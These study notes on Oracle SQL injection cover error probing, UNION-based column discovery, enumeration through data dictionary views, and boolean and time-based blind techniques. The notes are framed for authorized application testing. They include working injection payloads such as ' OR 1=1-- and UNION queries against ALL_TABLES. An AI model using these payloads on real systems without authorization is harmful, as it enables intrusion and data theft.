# Oracle SQL Injection — Testing & Enumeration Notes

## 1. Identifying SQL Injection

### Initial testing

Start by observing how the application behaves when you introduce SQL metacharacters.

```sql
'
```

- Observe whether the application returns a database error.
- Look for changes in the response, status code, response length, or application behaviour.
- A database-related error is an indication of a potential SQL injection point, not definitive proof of exploitable SQL injection.
- Some applications intentionally suppress database errors or return generic error messages.

### Testing quotation behaviour

Try multiple quotation marks:

```sql
''
'''
''''
```

Observe whether the application:
- Returns a database error.
- Changes its response.
- Handles the input differently.
- Rejects the input through application-level validation.

Comparing these responses can help identify how the application handles SQL metacharacters.

**Important:** An error may originate from application validation, an ORM, a database driver, or the database itself. Don't automatically classify every error as SQL injection.

---

## 2. SQL Comments and URL Encoding

When testing an injection point inside a quoted SQL string, you may need to close the original string and neutralize the remaining SQL statement.

Oracle supports:

| Comment syntax | Description |
|---|---|
| `--` | Single-line comment |
| `/* */` | Multiline comment |

Example:

```sql
' OR 1=1--
```

The `--` comments out the remainder of the SQL statement.

### URL encoding

When injecting through URL parameters:

- `+` commonly represents a space in `application/x-www-form-urlencoded` query parameters.
- `%20` is another common encoding for spaces.
- `%27` represents a single quotation mark.
- `%2D%2D` represents `--`.

Example:

```text
?name=%27+OR+1%3D1--
```

**Important:** A plus sign is not universally interpreted as a space in every URL context. Encoding requirements depend on how the application parses the parameter.

---

## 3. UNION-Based SQL Injection

UNION-based SQL injection allows an attacker to combine the application's original query results with results from an injected SELECT statement.

### Step 1: Identify the number of columns

Start with NULL values and increment the number of columns until the query is compatible.

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL--
```

Continue until you identify a compatible column count.

You can also use `ORDER BY` to identify column positions:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

An error at a particular position can indicate that the query doesn't contain that many columns.

### Step 2: Identify displayable columns

Once the number of columns is known, replace individual NULL values with test values.

For example:

```sql
' UNION SELECT 'test',NULL--
```

```sql
' UNION SELECT NULL,'test'--
```

Observe which columns appear in the application's response.

### Step 3: Retrieve database information

Once the compatible column positions and data types are understood, they can be used to retrieve database metadata.

### Step 4: Multiple-column enumeration

UNION can retrieve information from multiple columns simultaneously.

Example:

```sql
' UNION SELECT table_name,owner FROM all_tables--
```

This requires compatible data types and the correct number of columns.

### Important UNION requirements

- Both SELECT statements must return the same number of columns.
- Corresponding columns must have compatible data types.
- The injected results must be observable through the application's response.
- Application filtering and query structure can affect whether the payload works.

---

## 4. Oracle Database Metadata Enumeration

Oracle provides built-in data dictionary views that expose information about database objects.

These are particularly useful during Oracle SQL injection testing.

### Important distinction

Oracle has three commonly used metadata-view prefixes:

| Prefix | Information exposed |
|---|---|
| USER_ | Objects owned by the current database user |
| ALL_ | Objects accessible to the current database user |
| DBA_ | Database-wide information, generally requiring elevated privileges |

### 4.1 Table enumeration

**ALL_TABLES**

Returns information about tables accessible to the current user.

```sql
SELECT table_name FROM all_tables;
```

**USER_TABLES**

Returns tables owned by the current user.

```sql
SELECT table_name FROM user_tables;
```

**DBA_TABLES**

Returns database-wide table information, subject to privileges.

```sql
SELECT table_name FROM dba_tables;
```

### 4.2 Column enumeration

**ALL_TAB_COLUMNS**

Returns column metadata for accessible tables.

```sql
SELECT column_name
FROM all_tab_columns
WHERE table_name = 'USERS';
```

**USER_TAB_COLUMNS**

Returns column metadata for tables owned by the current user.

```sql
SELECT column_name
FROM user_tab_columns
WHERE table_name = 'USERS';
```

**DBA_TAB_COLUMNS**

Returns database-wide column metadata, subject to privileges.

```sql
SELECT column_name
FROM dba_tab_columns
WHERE table_name = 'USERS';
```

### 4.3 Other useful metadata views

| View | Purpose |
|---|---|
| ALL_OBJECTS | Accessible database objects |
| USER_OBJECTS | Objects owned by the current user |
| ALL_VIEWS | Accessible views |
| ALL_CONSTRAINTS | Accessible constraints |
| ALL_INDEXES | Accessible indexes |
| ALL_TAB_PRIVS | Object privileges |
| ALL_USERS | Database users |
| USER_SEQUENCES | Sequences owned by the current user |

### Important metadata columns

| Column | Description |
|---|---|
| TABLE_NAME | Name of a table |
| COLUMN_NAME | Name of a column |
| OWNER | Schema owning the object |
| DATA_TYPE | Column data type |
| OBJECT_NAME | Name of a database object |
| OBJECT_TYPE | Type of database object |

**Remember:** TABLE_NAME and COLUMN_NAME are columns within metadata views. They are not standalone database views.

Oracle normally stores unquoted identifiers in uppercase, so table-name comparisons are commonly written in uppercase.

---

## 5. Oracle-Specific SQL Functions and Values

Unlike MySQL, Oracle has its own set of functions and database-specific objects.

### Database version

```sql
SELECT banner FROM v$version;
```

### Current database user

```sql
SELECT USER FROM dual;
```

Alternative:

```sql
SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual;
```

### Current schema

```sql
SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual;
```

### Current database name

```sql
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
```

### Current date and time

```sql
SELECT SYSDATE FROM dual;
```

### Timestamp

```sql
SELECT CURRENT_TIMESTAMP FROM dual;
```

### String concatenation

Oracle uses `||`:

```sql
SELECT 'ORACLE' || ' SQL' FROM dual;
```

### NULL handling

Oracle uses `NVL()`:

```sql
SELECT NVL(NULL, 'DEFAULT') FROM dual;
```

### Length

```sql
SELECT LENGTH('ORACLE') FROM dual;
```

### Substring

```sql
SELECT SUBSTR('ORACLE',1,3) FROM dual;
```

### ASCII value

```sql
SELECT ASCII('A') FROM dual;
```

---

## 6. Understanding DUAL

DUAL is a special one-row table available in Oracle.

It allows expressions and functions to be evaluated without querying an application table.

Example:

```sql
SELECT 1+1 FROM dual;
```

Result:

```text
2
```

Other examples:

```sql
SELECT USER FROM dual;
```

```sql
SELECT SYSDATE FROM dual;
```

```sql
SELECT 'HELLO' FROM dual;
```

**Remember:** DUAL is a standard Oracle database object. It is not an application-created table.

---

## 7. Error-Based SQL Injection

Error-based SQL injection attempts to extract information through database error messages.

Unlike UNION-based injection, it does not require the application to display the results of a SELECT query.

However, useful database errors must be observable.

### CAST

CAST converts an expression into a specified data type.

Example:

```sql
' AND 1=CAST((SELECT 1 FROM dual) AS NUMBER)--
```

This demonstrates Oracle's CAST syntax.

You can replace the scalar subquery with another expression that returns a compatible value.

For example:

```sql
SELECT CAST('123' AS NUMBER) FROM dual;
```

**Important:** CAST itself does not automatically produce an informative error. An error-based technique requires an expression that actually triggers an observable database error.

Oracle also has other conversion functions, including:

- TO_NUMBER()
- TO_CHAR()
- TO_DATE()
- TO_TIMESTAMP()

---

## 8. Boolean-Based Blind SQL Injection

Boolean-based SQL injection relies on differences in application responses when a condition evaluates to TRUE or FALSE.

Example:

```sql
' AND 1=1--
```

```sql
' AND 1=2--
```

Compare the responses.

If the application behaves differently, it may indicate that the injected condition influences the SQL query.

This technique is useful when:
- Database errors are suppressed.
- Query results are not directly displayed.
- The application produces distinguishable TRUE/FALSE responses.

### Information extraction

Boolean conditions can also be used to investigate individual characters of database values.

For example, Oracle provides:

```sql
SUBSTR()
ASCII()
LENGTH()
```

These functions can help construct character-based conditions.

---

## 9. Time-Based Blind SQL Injection

Time-based SQL injection uses delays to infer whether a SQL condition has been evaluated.

Oracle has several mechanisms that can introduce delays, depending on available privileges.

One example is:

```sql
DBMS_PIPE.RECEIVE_MESSAGE()
```

This is a package procedure that can wait for a specified duration.

Important considerations:

- Package execution privileges may be restricted.
- Application and network latency can introduce noise.
- A delay alone does not establish SQL injection.
- Compare repeated TRUE/FALSE tests to reduce false positives.

---

## 10. XML-Based Application Testing

When an application accepts XML input, first determine how the XML is processed.

Potential processing mechanisms include:

- XML parsing.
- XPath evaluation.
- XQuery.
- SQL queries constructed using XML-derived values.

Do not assume that XML input automatically means SQL injection.

### Arithmetic expressions

Where the application evaluates expressions, simple mathematical expressions can help identify whether input is interpreted or treated as literal data.

For example:

```text
1*2
```

Compare the result against the literal input.

If the application evaluates the expression, investigate the underlying processing mechanism before assuming SQL injection.

If XML-derived values reach a SQL query, investigate SQL injection using the appropriate database-specific techniques.

**Note:** XPath injection and SQL injection are different vulnerability classes.

---

## 11. Oracle vs MySQL — Quick Reference

| Feature | MySQL | Oracle |
|---|---|---|
| Version | VERSION() | V$VERSION |
| Current user | USER() | USER |
| Current date | NOW() | SYSDATE |
| String concatenation | CONCAT() | `||` |
| NULL handling | IFNULL() | NVL() |
| Table metadata | information_schema | ALL_TABLES |
| Column metadata | information_schema.columns | ALL_TAB_COLUMNS |
| Row limit | LIMIT | FETCH FIRST |
| Delay | SLEEP() | DBMS_PIPE.RECEIVE_MESSAGE() |
| Dummy table | Not generally needed | DUAL |
| Procedural language | Stored-program SQL | PL/SQL |

---

## 12. Oracle SQL Injection Testing Workflow

A practical investigation sequence:

1. **Identify the input context:** Determine whether the parameter is incorporated into a SQL query and whether it is inside a quoted string.
2. **Test SQL metacharacters:** Observe errors and response differences.
3. **Determine query structure:** Investigate quotation handling and the original query context.
4. **Identify the injection technique:** Determine whether UNION, error-based, boolean-based, or time-based testing is appropriate.
5. **Determine column count:** For UNION injection, establish the required number of columns.
6. **Identify compatible output columns:** Determine which positions can return visible values.
7. **Identify database metadata:** Use ALL_TABLES, ALL_TAB_COLUMNS, and other appropriate views.
8. **Investigate the application schema:** Understand relevant tables and their relationships.
9. **Validate impact:** Demonstrate the security consequence using only authorized test data.
10. **Document evidence:** Preserve requests, responses, observed behaviour, and reproducibility steps.

---

## 13. Important Oracle Objects to Memorize

| Object | Type | Purpose |
|---|---|---|
| DUAL | Table | Evaluate expressions |
| ALL_TABLES | Data dictionary view | Accessible tables |
| USER_TABLES | Data dictionary view | Owned tables |
| DBA_TABLES | Data dictionary view | Database-wide tables |
| ALL_TAB_COLUMNS | Data dictionary view | Accessible columns |
| USER_TAB_COLUMNS | Data dictionary view | Owned columns |
| ALL_OBJECTS | Data dictionary view | Accessible objects |
| ALL_USERS | Data dictionary view | Database users |
| V$VERSION | Dynamic performance view | Database version |
| USER | Pseudocolumn-like SQL expression | Current database user |

### Final takeaway

For Oracle SQL injection testing, prioritize understanding:

1. UNION-based enumeration.
2. Oracle data dictionary views.
3. DUAL.
4. Oracle-specific functions.
5. Error-based and blind SQL injection.
6. Privilege-dependent metadata access.

You do not need to memorize hundreds of Oracle functions. Understanding the database's metadata architecture and knowing how to discover its schema is much more valuable during practical application security testing.
